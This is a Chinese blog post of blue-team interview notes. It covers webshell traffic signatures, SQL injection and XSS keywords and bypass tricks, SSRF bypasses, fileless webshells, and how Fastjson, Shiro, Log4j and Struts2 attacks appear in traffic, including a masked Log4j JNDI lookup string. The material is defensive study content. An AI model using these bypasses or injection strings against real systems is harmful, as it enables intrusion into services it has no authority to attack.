+<p>答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求&#x2F;响应进行防护。</p>
+<p><strong>（9）谈谈蚁剑&#x2F;菜刀&#x2F;冰蝎&#x2F;哥斯拉的特征</strong></p>
+<ul>
+<li><p><strong>蚁剑AntSword</strong>:支持自定义加密，但shell不稳定，且对JSP兼容性比较差；特征码为</p>
+<p>data:(“display<em>errors” AND “set</em>time_limit(0)”) ，agent:”antSword&#x2F;v2.0”</p>
+</li>
+<li><p><strong>菜刀</strong>：流量Base64编码，特征比较固定。特征码：base64_decode”;eval;z0、z1，存在固定的base编码字符</p>
+</li>
+</ul>
+<p><img src="https://flowus.cn/preview/9358d9b8-0194-4c1a-b048-cdfff5ffe62d" alt="image.png"></p>
+<ul>
+<li><strong>冰蝎Behinder</strong>：流量动态AES加密，一般http包头中 content-type为application&#x2F;octet-stream；若发现有冰蝎Webshell文件上传的告警事件，可根据数据包中的上传路径以登录服务器排查文件的方式进一步确认冰蝎 WebShell 是否被上传成功。若访问发现相关文件存在，确认 WebShell 成功上传到了服务器。</li>
+<li><strong>哥斯拉Godzilla：</strong>基于流量、HTTP全加密的webshell工具，看不出有明显的攻击特征，需要结合流量找到哥斯拉webshell上传成功的流量来进行分析和判断，另外该工具自带了 一些插件模块，实现了写无文件 WebShell 等强大的功能，可以伪造UA头和Accept头，消除请求包和响应包中的特征。</li>
+</ul>
+<p><strong>（10）SQL注入有哪些常见的特征？</strong></p>
+<ul>
+<li><strong>一些常见的关键字：</strong>select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等</li>
+<li><strong>一些常见的sql函数：</strong>user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。</li>
+</ul>
+<p><strong>（11）XSS弹窗函数和常见的XSS绕过策略？</strong></p>
+<ul>
+<li><strong>弹窗函数：</strong>alert、confirm、prompt、onclick</li>
+<li><strong>绕过策略：</strong>大小写混写；双写；<img src="/1" alt="img">；%0a或者%0d绕过；拼凑绕过</li>
+</ul>
+<p><strong>（12）无文件Webshell实现的方式有哪些？</strong></p>
+<ul>
+<li>基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell</li>
+<li>基于特定框架，如 Spring 框架下动态注册 Controller 等。</li>
+<li>基于 JAVA Agent，如 memShell</li>
+</ul>
+<p><strong>（13）响应状态码都有哪些？</strong></p>
+<p>不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑）</p>
+<ul>
+<li><strong>404：</strong>404 状态码表示请求资源不存在，即表示攻击失败；</li>
+</ul>
+<p><img src="https://s2.loli.net/2024/04/12/pbycsJtfrWjnNGK.jpg" alt="https://mmbiz.qpic.cn/mmbiz_jpg/RR4TjsSzEBzlIy6drKS9n8u9sPIibhAoR6rzID9j0bB3YYt9YlYEFn42je2eiawawY2bkDHrbOSfULqDsOpLmI2g/640?wx_fmt=jpeg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"></p>
+<ul>
+<li><strong>401：</strong>401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。</li>
+<li><strong>500：</strong>500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。</li>
+<li><strong>301</strong>：本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。</li>
+<li><strong>302</strong>：本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL.</li>
+</ul>
+<h2 id="大概率面试题目"><a href="#大概率面试题目" class="headerlink" title="大概率面试题目"></a>大概率面试题目</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">APP抓不到包怎么办</span><br><span class="line"></span><br><span class="line">Burp+Xposed+JustTrustMe抓包</span><br><span class="line"></span><br><span class="line">dnslog你就把他理解成你自己的一个外网服务器，因为你自己的电脑常规来说是局域网，</span><br><span class="line">所以需要一个外网服务器判断服务器是否出网或命令执行是否成功。</span><br><span class="line"></span><br><span class="line">1.怎么判断报警是不是误报？2.用过那些安全设备？设备的功能有哪些？3.怎么判断是否是真实的外部攻击？</span><br><span class="line"></span><br><span class="line">1.根据返回包判断是否成功  判断报警，把报警日志里IP放到情报威胁平台分析，同时分析请求包返回包包，注重xff和x-real-ip，还有webshell的流量特征</span><br><span class="line"><span class="bullet">2.</span> 设备基本分为监控 阻断 两种</span><br><span class="line">3 真实攻击具备高线程 具有非正常用户访问特征，以及变异数据包</span><br><span class="line"></span><br><span class="line">webshell特征</span><br><span class="line">冰蝎2.0   强特征是accept里面有个q=.2</span><br><span class="line">蚁剑是ua有answord    蚁剑的加密特征是以 &quot;0x.....=&quot;开头</span><br><span class="line">哥斯拉pass字段</span><br><span class="line">冰蝎3.0    Content-Type: application/octet-stream</span><br><span class="line">菜刀流量存在一些特征字 eval  base64</span><br><span class="line"></span><br><span class="line">SQL注入  报错注入常用函数</span><br><span class="line">floor（）</span><br><span class="line">updatexml()</span><br><span class="line">extravalue()</span><br><span class="line">exp()</span><br><span class="line">multipoit()</span><br><span class="line"></span><br><span class="line">布尔注入 函数</span><br><span class="line">ascii()</span><br><span class="line">substr()</span><br><span class="line">hex()</span><br><span class="line"></span><br><span class="line">AWVS扫描器的特征 </span><br><span class="line">主要是看请求包中是否含有</span><br><span class="line">acunetix  wvs 字段</span><br><span class="line"></span><br><span class="line">Nessus扫描器的特征</span><br><span class="line">nessus字段</span><br><span class="line"></span><br><span class="line">XXE漏洞</span><br><span class="line">修复：过滤用户提交的XML数据</span><br><span class="line">使用开发语言提供的禁用外部实体的方法</span><br><span class="line">禁止外部实体引入</span><br><span class="line"></span><br><span class="line">xss</span><br><span class="line">对字符实体进行转义、</span><br><span class="line">使用HTTP Only来禁JavaScript读取Cookie值、</span><br><span class="line">输入时校验、浏览器与Web应用端采用相同的字符编码</span><br><span class="line"></span><br><span class="line">csrf</span><br><span class="line">筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、</span><br><span class="line">检验Referer</span><br><span class="line"></span><br><span class="line">越权</span><br><span class="line">对参数的白名单过滤</span><br><span class="line">对权限的控制管理重新设计与限制</span><br><span class="line">限制下载文件的类型</span><br><span class="line"></span><br><span class="line">ssrf绕过</span><br><span class="line">进制转换</span><br><span class="line">利用句号</span><br><span class="line">利用@</span><br><span class="line">利用短地址</span><br><span class="line">协议 DIct SFTP   TFTP LDAP Gopher</span><br><span class="line"></span><br><span class="line">修复</span><br><span class="line">禁用一些协议，</span><br><span class="line">设置白名单，限制访问内网ip</span><br><span class="line">设置统一错误页面避免用户根据错误信息判断端口开发状态</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SQL注入 原理</span><br><span class="line">程序开发过程中不注意规范书写sql语句和对特殊字符进行过滤</span><br><span class="line"></span><br><span class="line">修复</span><br><span class="line">关闭 SQL 错误回显</span><br><span class="line">前端输入字符白名单验证</span><br><span class="line">对输入的特殊字符使用转义处理</span><br><span class="line">SQL 服务运行于专门的账号，并且使用最小权限</span><br><span class="line">限制 SQL 服务的远程访问，只开放给特定开发人员</span><br><span class="line">使用成熟的 waf</span><br><span class="line">预编译</span><br><span class="line"></span><br><span class="line">基线检查</span><br><span class="line">对操作系统，数据库以及中间件等服务进行一些</span><br><span class="line">安全配置的检查。(版本,弱口令）。</span><br><span class="line"></span><br><span class="line">正向代理和反向代理的区别</span><br><span class="line">正向代理代理的是客户端,反向代理代理的是服务端</span><br><span class="line">正向代理是在客户端搭建，反向代理是在服务端搭建</span><br><span class="line">正向代理主要目的是解决访问限制问题</span><br><span class="line">反向代理起到安全防护的作用</span><br></pre></td></tr></table></figure>
+
+<h2 id="常见安全设备"><a href="#常见安全设备" class="headerlink" title="常见安全设备"></a>常见安全设备</h2><p>常见安全设备 天眼 椒图 af深信服 sip态势感知系统 雷池 等等</p>
+<p><strong>态势感知</strong>：奇安信设备-天眼 深信服-sip态势感知</p>
+<p><strong>主机安全</strong>：青藤云万相主机安全设备</p>
+<p><strong>蜜罐设备</strong>：长亭谛听</p>
+<p>介绍</p>
+<p><strong>ips</strong></p>
+<p>对该设备的网络流量进行分析监控，发现攻击后就会进行拦截。IPS是防火墙的重要补充，如果是防火墙是第一道防线，IPS就是第二道防线。</p>
+<p><strong>ids</strong></p>
+<p>监视记录网络中的各种攻击企图。特点就是记录，不会对攻击行为进行拦截，只能事中检测和时候追查。</p>
+<p><strong>蜜罐</strong></p>
+<p>部署一些作为诱饵的主机，诱使攻击方对蜜罐进行过攻击，对攻击方的攻击行为进行捕捉和分析，了解攻击方使用的工具和方法，从而增强增强真实系统的安	全防护能力。</p>
+<p><strong>waf</strong></p>
+<p>web应用防火墙，专门针对于HTTP和https请求，对客户端的请求内容进行检测，确保其合法性和安全性，还会对非法的请求进行及时的阻断</p>
+<h2 id="面试2"><a href="#面试2" class="headerlink" title="面试2"></a>面试2</h2><h3 id="1-Fastjson"><a href="#1-Fastjson" class="headerlink" title="1. Fastjson"></a>1. Fastjson</h3><p>fastjson就是为了知道传入的json中的值是什么类型。加了autotype机制导致的。因为他为了知道是什么详细类型，每次都需要读取下@type导致的，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p>
+<ul>
+<li><p>流量特征：</p>
+<ul>
+<li>1.请求头：method: POST content_type: application&#x2F;json</li>
+<li>2.请求体：data:com.sun.rowset.JdbcRowSetImpl,dataSourceName,@type</li>
+<li>3.请求体: 包含攻击者C2服务器地址</li>
+<li>状态码为：400  也可能是5005.通过态势感知平台进行回溯分析，在分析中心输入语法：(sip:(失陷服务器IP) OR sip:(攻击者C2IP)) AND (dip:(失陷服务器IP) OR dip:(攻击者C2IP))</li>
+</ul>
+</li>
+<li><p>不出网的利用方式</p>
+<ul>
+<li>TemplatesImpl</li>
+<li>利用内部网络中的其他服务或系统进行攻击</li>
+<li>C3P0二次序列化</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-Shiro"><a href="#2-Shiro" class="headerlink" title="2. Shiro"></a>2. Shiro</h3><p><strong>原理</strong>： 其反序列化漏洞（CVE-2016-4437）允许攻击者利用shiro的默认密钥伪造cookie,通过构造恶意的rememberMe cookie进行反序列化攻击，进而执行任意代码。</p>
+<p><strong>流量特征</strong>：</p>
+<ul>
+<li><p>在HTTP请求头Cookie里出现rememberMe&#x3D;deleteMe字段以及可能出现自定义类型例如c: aWQ&#x3D;，响应体中出现大量编码字符串，若需要判断是否攻击成功，需对请求数据和响应体内容进行解密判断</p>
+</li>
+<li><p>检查请求头中的”rememberMe” cookie。攻击者可能会在此处插入恶意序列化数据</p>
+</li>
+<li><p>观察服务器响应。如果服务器返回了异常错误信息，如Java反序列化异常，可能表明攻击成功分析应用程序日志:如果日志中出现了异常堆栈跟踪，可能表明攻击成功例如，攻击者发送了一个包含恶意序列化数据的请求，服务器响应了一个包含Java反序列化异常的错误信息这可能表明攻击成功。</p>
+</li>
+<li></li>
+</ul>
+<h3 id="3-Log4j"><a href="#3-Log4j" class="headerlink" title="3. Log4j"></a>3. Log4j</h3><p><strong>原理</strong>： log4j是一款通用日志记录工具，log4j有个lookup接口通过JNDI注入触发日志，在{}里面调用jndi服务反弹shell到指定的服务器攻击者在程序的日志中插入恶意的代码，这个代码可以被Log4j2组件解析，Log4j2连接到服务器时，恶意代码会被执行。</p>
+<p><strong>攻击特征</strong>：</p>
+<ul>
+<li>恶意字符串：攻击者发送特制的字符串，如<code>$&#123;jndi:ldap://***&#125;</code>。</li>
+<li>JNDI查找：Log4j解析该字符串并尝试通过JNDI查找机制加载攻击者指定的恶意类，导致代码执行。</li>
+</ul>
+<p><strong>如何研判</strong>：</p>
+<ul>
+<li><strong>日志扫描</strong>：检查日志文件中是否存在可疑的JNDI查找字符串。</li>
+<li><strong>防御措施</strong>：升级到Log4j 2.15.0或更高版本，禁用JNDI查找。</li>
+<li><strong>网络流量监控</strong>：监控对外的JNDI查找请求，特别是LDAP协议的请求。</li>
+</ul>
+<h3 id="4-Struts2"><a href="#4-Struts2" class="headerlink" title="4. Struts2"></a>4. Struts2</h3><p>**原理:**struts2漏洞的原理主要涉及其处理用户输入的方式，特别是对OGNL表达式的不当处理。   大多数都是OGNL表达式注入及其绕过<br><strong>流量特征：</strong></p>
+<ol>
+<li>在请求头中存在OGNL表达式，一般在url中会出现的攻击特征主要是:.action?method | ?redirect:$ 在conten-type中出现的攻击特征主要有:%</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://RuiJiLuo.github.io">Rui Ji</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://ruijiluo.github.io/2023/12/20/HVV%E7%AC%94%E8%AE%B0/">http://ruijiluo.github.io/2023/12/20/HVV%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://RuiJiLuo.github.io" target="_blank">RJ の 博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" title="XSS跨站脚本"><img class="cover" src="https://s2.loli.net/2023/12/20/4dJUfz6p5ygLsZu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">XSS跨站脚本</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/15/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" title="暴力破解"><img class="cover" src="https://s2.loli.net/2023/12/15/eFXEOHPdqrBkgKI.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">暴力破解</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Rui Ji</div><div class="author-info__description">私 の hacker 夢</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ruijiluo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HVV%E7%AC%94%E8%AE%B0"><span class="toc-text">HVV笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98-%E5%B7%A5%E5%85%B7%E6%89%AB%E6%8F%8F%EF%BC%88%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF%EF%BC%89"><span class="toc-text">手工挖掘+工具扫描（挖掘思路）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84web%E7%B1%BB%E5%9E%8B%E6%89%AB%E6%8F%8F%E5%99%A8%EF%BC%9A"><span class="toc-text">常见的web类型扫描器：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%BB%E6%9C%BA%E7%B1%BB%E5%9E%8B%E6%89%AB%E6%8F%8F%E5%99%A8%EF%BC%9A"><span class="toc-text">常见的主机类型扫描器：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8%EF%BC%9A"><span class="toc-text">常见的端口扫描器：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%96%B9%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-text">漏洞验证方面的工具：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-text">信息收集方面的工具：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E3%80%81Windows"><span class="toc-text">Linux、Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">1.   操作系统常用命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#linux"><span class="toc-text">linux</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%9A"><span class="toc-text">2.Linux操作系统：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%9A"><span class="toc-text">3.Windows操作系统：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E5%92%8C%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA%EF%BC%9A"><span class="toc-text">3.系统安全配置和基线加固：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE"><span class="toc-text">协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B"><span class="toc-text">OSI七层模型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#TCP-IP"><span class="toc-text">TCP&#x2F;IP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%92%8C%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B%EF%BC%9A"><span class="toc-text">三次握手和四次挥手：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-text">状态码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">伪协议:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OWASP-TOP10%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2021"><span class="toc-text">OWASP TOP10漏洞原理 (2021)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2021%E7%89%88%E6%9C%AC"><span class="toc-text">2021版本:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2021%E4%B8%BE%E4%BE%8B"><span class="toc-text">2021举例:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2017%E7%89%88%E6%9C%AC"><span class="toc-text">2017版本:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="toc-text">1. 注入攻击：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%82%B9%E6%80%8E%E4%B9%88%E6%8B%BF%E5%88%B0webshell%EF%BC%8C%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-text">sql注入点怎么拿到webshell，利用条件有哪些</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="toc-text">2. 跨站脚本（XSS）攻击：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%9A%B4%E9%9C%B2%EF%BC%9A"><span class="toc-text">3. 敏感数据暴露：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-XML-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB-xxe-%EF%BC%9A"><span class="toc-text">4. XML 外部实体攻击(xxe)：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E7%BC%BA%E5%A4%B1%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%EF%BC%9A"><span class="toc-text">5. 缺失的身份认证：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%9A"><span class="toc-text">6. 不安全的访问控制：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%EF%BC%9A"><span class="toc-text">7. 安全配置错误：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="toc-text">8. 跨站请求伪造（CSRF）攻击：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9-%E4%BD%BF%E7%94%A8%E5%B7%B2%E7%9F%A5%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-text">9. 使用已知的漏洞：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A"><span class="toc-text">10. 不安全的反序列化：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssrf-%E5%8E%9F%E7%90%86%E3%80%81%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5%E3%80%81%E5%8D%8F%E8%AE%AE-file-gopher-dict"><span class="toc-text">ssrf 原理、防御手段、协议(file gopher dict)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssrf%E5%88%A9%E7%94%A8"><span class="toc-text">ssrf利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E3%80%81CSRF%E3%80%81SSRF%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">XSS、CSRF、SSRF的区别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">文件包含漏洞概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-text">越权漏洞</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IDS-IPS"><span class="toc-text">IDS&#x2F;IPS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">业务逻辑漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1"><span class="toc-text">**服务 **</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CDN%E5%92%8CDNS%E5%8C%BA%E5%88%AB-%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87CDN"><span class="toc-text">CDN和DNS区别 如何绕过CDN</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E8%AF%B4%E4%B8%80%E4%B8%8BDNS%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">简单说一下DNS的工作原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#GET%E5%92%8CPOST%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">GET和POST的区别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E5%92%8CSession%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">Cookie和Session的区别</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3"><span class="toc-text">**端口 **</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E8%AF%B4%E8%AF%B43389%E7%AB%AF%E5%8F%A3%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-text">简要说说3389端口无法连接的几种情况</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E9%97%AE%E7%9A%84%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-text">常问的端口信息</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AD%A6%E5%91%8A%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD"><span class="toc-text">**发现shiro反序列化警告如何判断 **</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%ADshrio%E6%98%AF%E5%90%A6%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F"><span class="toc-text">如何判断shrio是否攻击成功</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 